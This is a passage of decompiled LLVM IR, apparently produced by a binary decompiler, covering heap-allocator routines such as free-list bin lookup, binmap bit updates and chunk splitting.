  store i32 ptrtoint (i32* @global_var_8058374.143 to i32), i32* %eax.global-to-local, align 4
  %v2_804d882 = add i32 %v3_804d84e, 8
  %v3_804d882 = inttoptr i32 %v2_804d882 to i32*
  store i32 ptrtoint (i32* @global_var_8058374.143 to i32), i32* %v3_804d882, align 4
  %v0_804d885 = load i32, i32* @edx, align 4
  store i32 %v0_804d885, i32* @global_var_8058380.144, align 4
  %v0_804d888 = load i32, i32* @edi, align 4
  %v15_804d888 = icmp eq i32 %v0_804d888, %v1_804db2e
  br i1 %v15_804d888, label %dec_label_pc_804de6f, label %dec_label_pc_804d892

dec_label_pc_804d892:                             ; preds = %dec_label_pc_804d87d
  %v6_804d898 = icmp ugt i32 %v0_804d888, 255
  br i1 %v6_804d898, label %dec_label_pc_804d8ab, label %dec_label_pc_804d89a

dec_label_pc_804d89a:                             ; preds = %dec_label_pc_804d892
  %v2_804d89c = udiv i32 %v0_804d888, 8
  store i32 %v2_804d89c, i32* %esi.global-to-local, align 4
  %v1_804d89f = mul nuw i32 %v2_804d89c, 8
  %v2_804d89f = add i32 %v1_804d89f, 134579052
  store i32 %v2_804d89f, i32* @ebx, align 4
  %v1_804d8a6 = add i32 %v1_804d89f, 134579060
  %v2_804d8a6 = inttoptr i32 %v1_804d8a6 to i32*
  %v3_804d8a6 = load i32, i32* %v2_804d8a6, align 4
  store i32 %v3_804d8a6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8f4

dec_label_pc_804d8ab:                             ; preds = %dec_label_pc_804d892
  store i32 %v0_804d888, i32* @eax, align 4
  %v0_804d8ad = call i32 @function_804d714()
  store i32 %v0_804d8ad, i32* %esi.global-to-local, align 4
  %v1_804d8b4 = mul i32 %v0_804d8ad, 8
  %v2_804d8b4 = add i32 %v1_804d8b4, ptrtoint (i32* @global_var_805836c.141 to i32)
  store i32 %v2_804d8b4, i32* %eax.global-to-local, align 4
  %v1_804d8bb = add i32 %v1_804d8b4, add (i32 ptrtoint (i32* @global_var_805836c.141 to i32), i32 8)
  %v2_804d8bb = inttoptr i32 %v1_804d8bb to i32*
  %v3_804d8bb = load i32, i32* %v2_804d8bb, align 4
  store i32 %v3_804d8bb, i32* %edx.global-to-local, align 4
  store i32 %v3_804d8bb, i32* @ebx, align 4
  %v12_804d8c4 = icmp eq i32 %v3_804d8bb, %v2_804d8b4
  br i1 %v12_804d8c4, label %dec_label_pc_804d8f4, label %dec_label_pc_804d8c8

dec_label_pc_804d8c8:                             ; preds = %dec_label_pc_804d8ab
  %v1_804d8c8 = add i32 %v1_804d8b4, add (i32 ptrtoint (i32* @global_var_805836c.141 to i32), i32 12)
  %v2_804d8c8 = inttoptr i32 %v1_804d8c8 to i32*
  %v3_804d8c8 = load i32, i32* %v2_804d8c8, align 4
  store i32 %v3_804d8c8, i32* @ebx, align 4
  %v0_804d8cb = load i32, i32* @edi, align 4
  %v2_804d8cb = add i32 %v3_804d8c8, 4
  %v3_804d8cb = inttoptr i32 %v2_804d8cb to i32*
  %v4_804d8cb = load i32, i32* %v3_804d8cb, align 4
  %v10_804d8cb = icmp ult i32 %v0_804d8cb, %v4_804d8cb
  %v1_804d8ce = icmp eq i1 %v10_804d8cb, false
  br i1 %v1_804d8ce, label %dec_label_pc_804d8d6, label %dec_label_pc_804d8f4

dec_label_pc_804d8d6:                             ; preds = %dec_label_pc_804d8c8
  %v1_804d8d8 = or i32 %v0_804d8cb, 1
  store i32 %v1_804d8d8, i32* %eax.global-to-local, align 4
  store i32 %v3_804d8bb, i32* %ebx.global-to-local, align 4
  %v2_804d8ec101 = add i32 %v3_804d8bb, 4
  %v3_804d8ec102 = inttoptr i32 %v2_804d8ec101 to i32*
  %v4_804d8ec103 = load i32, i32* %v3_804d8ec102, align 4
  %v10_804d8ec104 = icmp ult i32 %v1_804d8d8, %v4_804d8ec103
  br i1 %v10_804d8ec104, label %dec_label_pc_804d8dd, label %dec_label_pc_804d8f1

dec_label_pc_804d8dd:                             ; preds = %dec_label_pc_804d8d6, %dec_label_pc_804d8dd
  %v0_804d8f1105 = phi i32 [ %v3_804d8e1, %dec_label_pc_804d8dd ], [ %v3_804d8bb, %dec_label_pc_804d8d6 ]
  store i32 %v0_804d8f1105, i32* %ecx.global-to-local, align 4
  %v1_804d8e1 = add i32 %v0_804d8f1105, 8
  %v2_804d8e1 = inttoptr i32 %v1_804d8e1 to i32*
  %v3_804d8e1 = load i32, i32* %v2_804d8e1, align 4
  store i32 %v3_804d8e1, i32* %ecx.global-to-local, align 4
  store i32 %v3_804d8e1, i32* %ebx.global-to-local, align 4
  %v2_804d8ec = add i32 %v3_804d8e1, 4
  %v3_804d8ec = inttoptr i32 %v2_804d8ec to i32*
  %v4_804d8ec = load i32, i32* %v3_804d8ec, align 4
  %v10_804d8ec = icmp ult i32 %v1_804d8d8, %v4_804d8ec
  br i1 %v10_804d8ec, label %dec_label_pc_804d8dd, label %dec_label_pc_804d8f1

dec_label_pc_804d8f1:                             ; preds = %dec_label_pc_804d8dd, %dec_label_pc_804d8d6
  %v0_804d8f1.lcssa = phi i32 [ %v3_804d8bb, %dec_label_pc_804d8d6 ], [ %v3_804d8e1, %dec_label_pc_804d8dd ]
  %v1_804d8f1 = add i32 %v0_804d8f1.lcssa, 12
  %v2_804d8f1 = inttoptr i32 %v1_804d8f1 to i32*
  %v3_804d8f1 = load i32, i32* %v2_804d8f1, align 4
  store i32 %v3_804d8f1, i32* @ebx, align 4
  br label %dec_label_pc_804d8f4

dec_label_pc_804d8f4:                             ; preds = %dec_label_pc_804d89a, %dec_label_pc_804d8c8, %dec_label_pc_804d8ab, %dec_label_pc_804d8f1
  %v0_804d8f4 = phi i32 [ %v0_804d8ad, %dec_label_pc_804d8ab ], [ %v0_804d8ad, %dec_label_pc_804d8f1 ], [ %v0_804d8ad, %dec_label_pc_804d8c8 ], [ %v2_804d89c, %dec_label_pc_804d89a ]
  %stack_var_-64.1 = phi i32 [ %v2_804d8b4, %dec_label_pc_804d8ab ], [ %v0_804d8f1.lcssa, %dec_label_pc_804d8f1 ], [ %v2_804d8b4, %dec_label_pc_804d8c8 ], [ %v3_804d8a6, %dec_label_pc_804d89a ]
  %v1_804d8f6 = urem i32 %v0_804d8f4, 32
  %v2_804d8f6 = icmp eq i32 %v1_804d8f6, 0
  store i32 %v1_804d8f6, i32* %esi.global-to-local, align 4
  store i32 %v1_804d8f6, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804d900 = sdiv i32 %v0_804d8f4, 32
  store i32 %v2_804d900, i32* %edx.global-to-local, align 4
  br i1 %v2_804d8f6, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_804d8f4
  %v5_804d903 = shl i32 1, %v1_804d8f6
  store i32 %v5_804d903, i32* %eax.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_804d8f4, %bb
  %v5_804d905 = phi i32 [ 1, %dec_label_pc_804d8f4 ], [ %v5_804d903, %bb ]
  %v1_804d905 = mul nsw i32 %v2_804d900, 4
  %v2_804d905 = add i32 %v1_804d905, ptrtoint (i32* @global_var_8058674.145 to i32)
  %v3_804d905 = inttoptr i32 %v2_804d905 to i32*
  %v4_804d905 = load i32, i32* %v3_804d905, align 4
  %v6_804d905 = or i32 %v4_804d905, %v5_804d905
  store i32 %v6_804d905, i32* %v3_804d905, align 4
  %v0_804d90c = load i32, i32* @ebx, align 4
  %v1_804d90c = load i32, i32* @ebp, align 4
  %v2_804d90c = add i32 %v1_804d90c, 12
  %v3_804d90c = inttoptr i32 %v2_804d90c to i32*
  store i32 %v0_804d90c, i32* %v3_804d90c, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_804d913 = load i32, i32* @ebp, align 4
  %v2_804d913 = add i32 %v1_804d913, 8
  %v3_804d913 = inttoptr i32 %v2_804d913 to i32*
  store i32 %stack_var_-64.1, i32* %v3_804d913, align 4
  %v0_804d916 = load i32, i32* @ebp, align 4
  %v1_804d916 = load i32, i32* @ebx, align 4
  %v2_804d916 = add i32 %v1_804d916, 8
  %v3_804d916 = inttoptr i32 %v2_804d916 to i32*
  store i32 %v0_804d916, i32* %v3_804d916, align 4
  %v0_804d919 = load i32, i32* @ebp, align 4
  %v1_804d919 = load i32, i32* @esi, align 4
  %v2_804d919 = add i32 %v1_804d919, 12
  %v3_804d919 = inttoptr i32 %v2_804d919 to i32*
  store i32 %v0_804d919, i32* %v3_804d919, align 4
  %v0_804d91c = load i32, i32* @global_var_8058380.144, align 128
  store i32 %v0_804d91c, i32* @ebp, align 4
  %v9_804d922 = icmp eq i32 %v0_804d91c, 134579060
  %v1_804d928 = icmp eq i1 %v9_804d922, false
  br i1 %v1_804d928, label %dec_label_pc_804d84b, label %dec_label_pc_804d92e

dec_label_pc_804d92e:                             ; preds = %bb84, %dec_label_pc_804d91c.preheader
  br i1 %v8_804d7df, label %dec_label_pc_804d9bc, label %dec_label_pc_804d93c

dec_label_pc_804d93c:                             ; preds = %dec_label_pc_804d92e
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_804d940 = mul i32 %stack_var_-40.0.ph, 8
  %v2_804d940 = add i32 %v1_804d940, ptrtoint (i32* @global_var_805836c.141 to i32)
  store i32 %v2_804d940, i32* %edx.global-to-local, align 4
  %v1_804d947 = add i32 %v1_804d940, add (i32 ptrtoint (i32* @global_var_805836c.141 to i32), i32 12)
  %v2_804d947 = inttoptr i32 %v1_804d947 to i32*
  %storemerge1.pre = load i32, i32* %v2_804d947, align 4
  br label %dec_label_pc_804d9b8

dec_label_pc_804d94c:                             ; preds = %dec_label_pc_804d9b8
  %v1_804d94c = add i32 %v4_804d963, 4
  %v2_804d94c = inttoptr i32 %v1_804d94c to i32*
  %v3_804d94c = load i32, i32* %v2_804d94c, align 4
  store i32 %v3_804d94c, i32* %ebx.global-to-local, align 4
  %v1_804d94f = add i32 %v4_804d963, 12
  %v2_804d94f = inttoptr i32 %v1_804d94f to i32*
  %v3_804d94f = load i32, i32* %v2_804d94f, align 4
  store i32 %v3_804d94f, i32* @ecx, align 4
  %v1_804d952 = and i32 %v3_804d94c, -4
  store i32 %v1_804d952, i32* @ebx, align 4
  %v10_804d955 = icmp ult i32 %v1_804d952, %v1_804db2e
  br i1 %v10_804d955, label %dec_label_pc_804d9b8, label %dec_label_pc_804d95b

dec_label_pc_804d95b:                             ; preds = %dec_label_pc_804d94c
  %v1_804d95b = add i32 %v4_804d963, 8
  %v2_804d95b = inttoptr i32 %v1_804d95b to i32*
  %v3_804d95b = load i32, i32* %v2_804d95b, align 4
  store i32 %v3_804d95b, i32* @edx, align 4
  %v1_804d95e = add i32 %v3_804d95b, 12
  %v2_804d95e = inttoptr i32 %v1_804d95e to i32*
  %v3_804d95e = load i32, i32* %v2_804d95e, align 4
  %v15_804d95e = icmp eq i32 %v3_804d95e, %v4_804d963
  %v1_804d961 = icmp eq i1 %v15_804d95e, false
  br i1 %v1_804d961, label %dec_label_pc_804d968, label %dec_label_pc_804d963

dec_label_pc_804d963:                             ; preds = %dec_label_pc_804d95b
  %v1_804d963 = add i32 %v3_804d94f, 8
  %v2_804d963 = inttoptr i32 %v1_804d963 to i32*
  %v3_804d963 = load i32, i32* %v2_804d963, align 4
  %v15_804d963 = icmp eq i32 %v3_804d963, %v4_804d963
  br i1 %v15_804d963, label %dec_label_pc_804d96d, label %dec_label_pc_804d968

dec_label_pc_804d968:                             ; preds = %dec_label_pc_804d963, %dec_label_pc_804d95b
  %v0_804d968 = call i32 @function_804e2a4()
  store i32 %v0_804d968, i32* %eax.global-to-local, align 4
  %v0_804d96d.pre = load i32, i32* @ebx, align 4
  %v0_804d973.pre = load i32, i32* @ecx, align 4
  %v1_804d973.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804d96d

dec_label_pc_804d96d:                             ; preds = %dec_label_pc_804d963, %dec_label_pc_804d968
  %v1_804d973 = phi i32 [ %v3_804d95b, %dec_label_pc_804d963 ], [ %v1_804d973.pre, %dec_label_pc_804d968 ]
  %v0_804d973 = phi i32 [ %v3_804d94f, %dec_label_pc_804d963 ], [ %v0_804d973.pre, %dec_label_pc_804d968 ]
  %v0_804d96d = phi i32 [ %v1_804d952, %dec_label_pc_804d963 ], [ %v0_804d96d.pre, %dec_label_pc_804d968 ]
  %v5_804d96f = sub i32 %v0_804d96d, %v1_804db2e
  store i32 %v5_804d96f, i32* %esi.global-to-local, align 4
  %v2_804d973 = add i32 %v1_804d973, 12
  %v3_804d973 = inttoptr i32 %v2_804d973 to i32*
  store i32 %v0_804d973, i32* %v3_804d973, align 4
  %v0_804d976 = load i32, i32* @edx, align 4
  %v1_804d976 = load i32, i32* @ecx, align 4
  %v2_804d976 = add i32 %v1_804d976, 8
  %v3_804d976 = inttoptr i32 %v2_804d976 to i32*
  store i32 %v0_804d976, i32* %v3_804d976, align 4
  %v0_804d979 = load i32, i32* %esi.global-to-local, align 4
  %v0_804d97c = load i32, i32* %eax.global-to-local, align 4
  %v1_804d97c = add i32 %v0_804d97c, 8
  store i32 %v1_804d97c, i32* @ecx, align 4
  %tmp127 = icmp ult i32 %v0_804d979, 16
  br i1 %tmp127, label %dec_label_pc_804de7d, label %dec_label_pc_804d985

dec_label_pc_804d985:                             ; preds = %dec_label_pc_804d96d
  %v2_804d989 = add i32 %v0_804d97c, %v1_804db2e
  store i32 %v2_804d989, i32* @edx, align 4
  %v1_804d98c = or i32 %v1_804db2e, 1
  store i32 %v1_804d98c, i32* %ebx.global-to-local, align 4
  %v2_804d98f = add i32 %v0_804d97c, 4
  %v3_804d98f = inttoptr i32 %v2_804d98f to i32*
  store i32 %v1_804d98c, i32* %v3_804d98f, align 4
  %v0_804d992 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d994 = or i32 %v0_804d992, 1
  store i32 %v1_804d994, i32* %eax.global-to-local, align 4
  %v0_804d997 = load i32, i32* @edx, align 4
  %v1_804d997 = load i32, i32* @ebp, align 4
  %v2_804d997 = add i32 %v1_804d997, 8
  %v3_804d997 = inttoptr i32 %v2_804d997 to i32*
  store i32 %v0_804d997, i32* %v3_804d997, align 4
  %v0_804d99a = load i32, i32* @edx, align 4
  %v1_804d99a = load i32, i32* @ebp, align 4
  %v2_804d99a = add i32 %v1_804d99a, 12
  %v3_804d99a = inttoptr i32 %v2_804d99a to i32*
  store i32 %v0_804d99a, i32* %v3_804d99a, align 4
  %v0_804d99d = load i32, i32* @edx, align 4
  %v1_804d99d = add i32 %v0_804d99d, 8
  %v2_804d99d = inttoptr i32 %v1_804d99d to i32*
  store i32 ptrtoint (i32* @global_var_8058374.143 to i32), i32* %v2_804d99d, align 4
  %v0_804d9a4 = load i32, i32* @edx, align 4
  %v1_804d9a4 = add i32 %v0_804d9a4, 12
  %v2_804d9a4 = inttoptr i32 %v1_804d9a4 to i32*
  store i32 ptrtoint (i32* @global_var_8058374.143 to i32), i32* %v2_804d9a4, align 4
  %v0_804d9ab = load i32, i32* %eax.global-to-local, align 4
  %v1_804d9ab = load i32, i32* @edx, align 4
  %v2_804d9ab = add i32 %v1_804d9ab, 4
  %v3_804d9ab = inttoptr i32 %v2_804d9ab to i32*
  store i32 %v0_804d9ab, i32* %v3_804d9ab, align 4
  %v0_804d9ae = load i32, i32* %esi.global-to-local, align 4
  %v1_804d9ae = load i32, i32* @edx, align 4
  %v3_804d9ae = add i32 %v1_804d9ae, %v0_804d9ae
  %v4_804d9ae = inttoptr i32 %v3_804d9ae to i32*
  store i32 %v0_804d9ae, i32* %v4_804d9ae, align 4
  br label %dec_label_pc_804de82

dec_label_pc_804d9b8:                             ; preds = %dec_label_pc_804d94c, %dec_label_pc_804d93c
  %v4_804d963 = phi i32 [ %storemerge1.pre, %dec_label_pc_804d93c ], [ %v3_804d94f, %dec_label_pc_804d94c ]
  store i32 %v4_804d963, i32* %eax.global-to-local, align 4
  %v12_804d9b8 = icmp eq i32 %v4_804d963, %v2_804d940
  %v1_804d9ba = icmp eq i1 %v12_804d9b8, false
  br i1 %v1_804d9ba, label %dec_label_pc_804d94c, label %dec_label_pc_804d9bc.loopexit

dec_label_pc_804d9bc.loopexit:                    ; preds = %dec_label_pc_804d9b8
  br label %dec_label_pc_804d9bc

dec_label_pc_804d9bc:                             ; preds = %dec_label_pc_804d9bc.loopexit, %dec_label_pc_804d92e
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804d9c5 = add i32 %stack_var_-40.0.ph, 1
  %v2_804d9c8 = udiv i32 %v1_804d9c5, 32
  store i32 %v2_804d9c8, i32* @edi, align 4
  %v1_804d9cb = mul i32 %v1_804d9c5, 8
  %v2_804d9cb = add i32 %v1_804d9cb, ptrtoint (i32* @global_var_805836c.141 to i32)
  store i32 %v2_804d9cb, i32* %ebx.global-to-local, align 4
  %v1_804d9d2 = urem i32 %v1_804d9c5, 32
  %v2_804d9d2 = icmp eq i32 %v1_804d9d2, 0
  store i32 %v1_804d9d2, i32* %ecx.global-to-local, align 4
  %v1_804d9d5 = mul nuw nsw i32 %v2_804d9c8, 4
  %v2_804d9d5 = add i32 %v1_804d9d5, ptrtoint (i32* @global_var_8058674.145 to i32)
  %v3_804d9d5 = inttoptr i32 %v2_804d9d5 to i32*
  %v4_804d9d5 = load i32, i32* %v3_804d9d5, align 4
  store i32 %v4_804d9d5, i32* %edx.global-to-local, align 4
  br i1 %v2_804d9d2, label %.preheader, label %bb85

bb85:                                             ; preds = %dec_label_pc_804d9bc
  %v5_804d9dc = shl i32 1, %v1_804d9d2
  store i32 %v5_804d9dc, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_804d9bc, %bb85, %dec_label_pc_804da1d
  %v1_804d9de = phi i32 [ %v1_804d9de.pre, %dec_label_pc_804da1d ], [ %v4_804d9d5, %bb85 ], [ %v4_804d9d5, %dec_label_pc_804d9bc ]
  %v0_804d9e2 = phi i32 [ %v0_804d9de.pre, %dec_label_pc_804da1d ], [ %v5_804d9dc, %bb85 ], [ 1, %dec_label_pc_804d9bc ]
  %tmp86 = icmp ule i32 %v0_804d9e2, %v1_804d9de
  %v1_804d9e2 = icmp eq i32 %v0_804d9e2, 0
  %v1_804d9e4 = icmp eq i1 %v1_804d9e2, false
  %or.cond = and i1 %tmp86, %v1_804d9e4
  br i1 %or.cond, label %dec_label_pc_804d9e2.dec_label_pc_804da12.preheader_crit_edge, label %dec_label_pc_804d9e6.preheader

dec_label_pc_804d9e2.dec_label_pc_804da12.preheader_crit_edge: ; preds = %.preheader
  %v0_804da0d12.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804da12.preheader

dec_label_pc_804d9e6.preheader:                   ; preds = %.preheader
  %v0_804d9e6.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d9e6

dec_label_pc_804d9e6:                             ; preds = %dec_label_pc_804d9e6.preheader, %dec_label_pc_804d9f0
  %v0_804d9e6 = phi i32 [ %v0_804d9e6.pre, %dec_label_pc_804d9e6.preheader ], [ %v1_804d9e6, %dec_label_pc_804d9f0 ]
  %v1_804d9e6 = add i32 %v0_804d9e6, 1
  store i32 %v1_804d9e6, i32* @edi, align 4
  %v6_804d9ea = icmp ugt i32 %v1_804d9e6, 2
  br i1 %v6_804d9ea, label %dec_label_pc_804da99.loopexit, label %dec_label_pc_804d9f0

dec_label_pc_804d9f0:                             ; preds = %dec_label_pc_804d9e6
  %v1_804d9f0 = mul i32 %v1_804d9e6, 4
  %v2_804d9f0 = add i32 %v1_804d9f0, ptrtoint (i32* @global_var_8058674.145 to i32)
  %v3_804d9f0 = inttoptr i32 %v2_804d9f0 to i32*
  %v4_804d9f0 = load i32, i32* %v3_804d9f0, align 4
  store i32 %v4_804d9f0, i32* %edx.global-to-local, align 4
  %v1_804d9f7 = icmp eq i32 %v4_804d9f0, 0
  br i1 %v1_804d9f7, label %dec_label_pc_804d9e6, label %dec_label_pc_804d9fb

dec_label_pc_804d9fb:                             ; preds = %dec_label_pc_804d9f0
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_804da02 = mul i32 %v1_804d9e6, 256
  store i32 %v2_804da02, i32* %eax.global-to-local, align 4
  %v1_804da05 = add i32 %v2_804da02, ptrtoint (i32* @global_var_805836c.141 to i32)
  store i32 %v1_804da05, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804da12.preheader

dec_label_pc_804da12.preheader:                   ; preds = %dec_label_pc_804d9e2.dec_label_pc_804da12.preheader_crit_edge, %dec_label_pc_804d9fb
  %v0_804da0d12 = phi i32 [ %v1_804da05, %dec_label_pc_804d9fb ], [ %v0_804da0d12.pre, %dec_label_pc_804d9e2.dec_label_pc_804da12.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_804d9fb ], [ %v0_804d9e2, %dec_label_pc_804d9e2.dec_label_pc_804da12.preheader_crit_edge ]
  %v0_804da24 = phi i32 [ %v4_804d9f0, %dec_label_pc_804d9fb ], [ %v1_804d9de, %dec_label_pc_804d9e2.dec_label_pc_804da12.preheader_crit_edge ]
  %v2_804da124 = and i32 %v0_804da24, %esi.promoted
  %v3_804da125 = icmp eq i32 %v2_804da124, 0
  br i1 %v3_804da125, label %dec_label_pc_804da0d, label %dec_label_pc_804da16

dec_label_pc_804da0d:                             ; preds = %dec_label_pc_804da12.preheader, %dec_label_pc_804da0d
  %v2_804da1014 = phi i32 [ %v2_804da10, %dec_label_pc_804da0d ], [ %esi.promoted, %dec_label_pc_804da12.preheader ]
  %v0_804da0d13 = phi i32 [ %v1_804da0d, %dec_label_pc_804da0d ], [ %v0_804da0d12, %dec_label_pc_804da12.preheader ]
  %v1_804da0d = add i32 %v0_804da0d13, 8
  %v2_804da10 = mul i32 %v2_804da1014, 2
  %v2_804da12 = and i32 %v2_804da10, %v0_804da24
  %v3_804da12 = icmp eq i32 %v2_804da12, 0
  br i1 %v3_804da12, label %dec_label_pc_804da0d, label %dec_label_pc_804da12.dec_label_pc_804da16_crit_edge

dec_label_pc_804da12.dec_label_pc_804da16_crit_edge: ; preds = %dec_label_pc_804da0d
  store i32 %v1_804da0d, i32* %ebx.global-to-local, align 4
  store i32 %v2_804da10, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804da16

dec_label_pc_804da16:                             ; preds = %dec_label_pc_804da12.dec_label_pc_804da16_crit_edge, %dec_label_pc_804da12.preheader
  %v0_804da26 = phi i32 [ %v2_804da10, %dec_label_pc_804da12.dec_label_pc_804da16_crit_edge ], [ %esi.promoted, %dec_label_pc_804da12.preheader ]
  %v1_804da40 = phi i32 [ %v1_804da0d, %dec_label_pc_804da12.dec_label_pc_804da16_crit_edge ], [ %v0_804da0d12, %dec_label_pc_804da12.preheader ]
  %v1_804da16 = add i32 %v1_804da40, 12
  %v2_804da16 = inttoptr i32 %v1_804da16 to i32*
  %v3_804da16 = load i32, i32* %v2_804da16, align 4
  store i32 %v3_804da16, i32* @ecx, align 4
  %v12_804da19 = icmp eq i32 %v3_804da16, %v1_804da40
  %v1_804da1b = icmp eq i1 %v12_804da19, false
  br i1 %v1_804da1b, label %dec_label_pc_804da31, label %dec_label_pc_804da1d

dec_label_pc_804da1d:                             ; preds = %dec_label_pc_804da16
  %v1_804da1f = add i32 %v3_804da16, 8
  store i32 %v1_804da1f, i32* %ebx.global-to-local, align 4
  %v1_804da22 = sub i32 -1, %v0_804da26
  store i32 %v1_804da22, i32* %eax.global-to-local, align 4
  %v2_804da24 = and i32 %v0_804da24, %v1_804da22
  store i32 %v2_804da24, i32* %edx.global-to-local, align 4
  %v2_804da26 = mul i32 %v0_804da26, 2
  store i32 %v2_804da26, i32* %esi.global-to-local, align 4
  %v1_804da28 = load i32, i32* @edi, align 4
  %v2_804da28 = mul i32 %v1_804da28, 4
  %v3_804da28 = add i32 %v2_804da28, ptrtoint (i32* @global_var_8058674.145 to i32)
  %v4_804da28 = inttoptr i32 %v3_804da28 to i32*
  store i32 %v2_804da24, i32* %v4_804da28, align 4
  %v0_804d9de.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804d9de.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_804da31:                             ; preds = %dec_label_pc_804da16
  %v1_804da31 = add i32 %v3_804da16, 4
  %v2_804da31 = inttoptr i32 %v1_804da31 to i32*
  %v3_804da31 = load i32, i32* %v2_804da31, align 4
  store i32 %v3_804da31, i32* %edx.global-to-local, align 4
  %v1_804da34 = add i32 %v3_804da16, 12
  %v2_804da34 = inttoptr i32 %v1_804da34 to i32*
  %v3_804da34 = load i32, i32* %v2_804da34, align 4
  store i32 %v3_804da34, i32* %eax.global-to-local, align 4
  %v1_804da37 = and i32 %v3_804da31, -4
  store i32 %v1_804da37, i32* @edx, align 4
  %v5_804da3c = sub i32 %v1_804da37, %v1_804db2e
  store i32 %v5_804da3c, i32* %esi.global-to-local, align 4
  store i32 %v3_804da34, i32* %v2_804da16, align 4
  %v0_804da43 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804da43 = load i32, i32* %eax.global-to-local, align 4
  %v2_804da43 = add i32 %v1_804da43, 8
  %v3_804da43 = inttoptr i32 %v2_804da43 to i32*
  store i32 %v0_804da43, i32* %v3_804da43, align 4
  %v0_804da46 = load i32, i32* %esi.global-to-local, align 4
  %tmp128 = icmp ult i32 %v0_804da46, 16
  br i1 %tmp128, label %dec_label_pc_804da4b, label %dec_label_pc_804da52

dec_label_pc_804da4b:                             ; preds = %dec_label_pc_804da31
  %v0_804da4b = load i32, i32* @ecx, align 4
  %v1_804da4b = load i32, i32* @edx, align 4
  %v2_804da4b = add i32 %v0_804da4b, 4
  %v3_804da4b = add i32 %v2_804da4b, %v1_804da4b
  %v4_804da4b = inttoptr i32 %v3_804da4b to i32*
  %v5_804da4b = load i32, i32* %v4_804da4b, align 4
  %v6_804da4b = or i32 %v5_804da4b, 1
  store i32 %v6_804da4b, i32* %v4_804da4b, align 4
  br label %dec_label_pc_804da91

dec_label_pc_804da52:                             ; preds = %dec_label_pc_804da31
  store i32 %v1_804db2e, i32* %eax.global-to-local, align 4
  %v0_804da5b = load i32, i32* @ecx, align 4
  %v2_804da5b = add i32 %v0_804da5b, %v1_804db2e
  store i32 %v2_804da5b, i32* @edx, align 4
  %v1_804da5e = load i32, i32* @ebp, align 4
  %v2_804da5e = add i32 %v1_804da5e, 8
  %v3_804da5e = inttoptr i32 %v2_804da5e to i32*
  store i32 %v2_804da5b, i32* %v3_804da5e, align 4
  %v0_804da61 = load i32, i32* @edx, align 4
  %v1_804da61 = load i32, i32* @ebp, align 4
  %v2_804da61 = add i32 %v1_804da61, 12
  %v3_804da61 = inttoptr i32 %v2_804da61 to i32*
  store i32 %v0_804da61, i32* %v3_804da61, align 4
  %v0_804da64 = load i32, i32* @edx, align 4
  %v1_804da64 = add i32 %v0_804da64, 8
  %v2_804da64 = inttoptr i32 %v1_804da64 to i32*
  store i32 ptrtoint (i32* @global_var_8058374.143 to i32), i32* %v2_804da64, align 4
  %v0_804da6b = load i32, i32* @edx, align 4
  %v1_804da6b = add i32 %v0_804da6b, 12
  %v2_804da6b = inttoptr i32 %v1_804da6b to i32*
  store i32 ptrtoint (i32* @global_var_8058374.143 to i32), i32* %v2_804da6b, align 4
  br i1 %v6_804d7e7, label %dec_label_pc_804da7a, label %dec_label_pc_804da74

dec_label_pc_804da74:                             ; preds = %dec_label_pc_804da52
  %v0_804da74 = load i32, i32* @edx, align 4
  store i32 %v0_804da74, i32* @global_var_8058370.142, align 16
  br label %dec_label_pc_804da7a

dec_label_pc_804da7a:                             ; preds = %dec_label_pc_804da52, %dec_label_pc_804da74
  %v4_804da7a = or i32 %v1_804db2e, 1
  %v0_804da7f = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_804da7a, i32* %ebx.global-to-local, align 4
  %v1_804da85 = or i32 %v0_804da7f, 1
  store i32 %v1_804da85, i32* %eax.global-to-local, align 4
  %v1_804da88 = load i32, i32* @ecx, align 4
  %v2_804da88 = add i32 %v1_804da88, 4
  %v3_804da88 = inttoptr i32 %v2_804da88 to i32*
  store i32 %v4_804da7a, i32* %v3_804da88, align 4
  %v0_804da8b = load i32, i32* %esi.global-to-local, align 4
  %v1_804da8b = load i32, i32* @edx, align 4
  %v3_804da8b = add i32 %v1_804da8b, %v0_804da8b
  %v4_804da8b = inttoptr i32 %v3_804da8b to i32*
  store i32 %v0_804da8b, i32* %v4_804da8b, align 4
  %v0_804da8e = load i32, i32* %eax.global-to-local, align 4
  %v1_804da8e = load i32, i32* @edx, align 4
  %v2_804da8e = add i32 %v1_804da8e, 4
  %v3_804da8e = inttoptr i32 %v2_804da8e to i32*
  store i32 %v0_804da8e, i32* %v3_804da8e, align 4
  br label %dec_label_pc_804da91

dec_label_pc_804da91:                             ; preds = %dec_label_pc_804da4b, %dec_label_pc_804da7a
  %v0_804da91 = load i32, i32* @ecx, align 4
  %v1_804da91 = add i32 %v0_804da91, 8
  store i32 %v1_804da91, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804de93

dec_label_pc_804da99.loopexit:                    ; preds = %dec_label_pc_804d9e6
  br label %dec_label_pc_804da99

dec_label_pc_804da99:                             ; preds = %dec_label_pc_804da99.loopexit, %dec_label_pc_804d7a1, %dec_label_pc_804d7a9
  %v0_804da99 = load i32, i32* @global_var_805836c.141, align 4
  store i32 %v0_804da99, i32* @ebx, align 4
  %v1_804daa3 = add i32 %v1_804db2e, 16
  store i32 %v1_804daa3, i32* @esi, align 4
  %v1_804daa6 = add i32 %v0_804da99, 4
  %v2_804daa6 = inttoptr i32 %v1_804daa6 to i32*
  %v3_804daa6 = load i32, i32* %v2_804daa6, align 4
  %v1_804daad = and i32 %v3_804daa6, -4
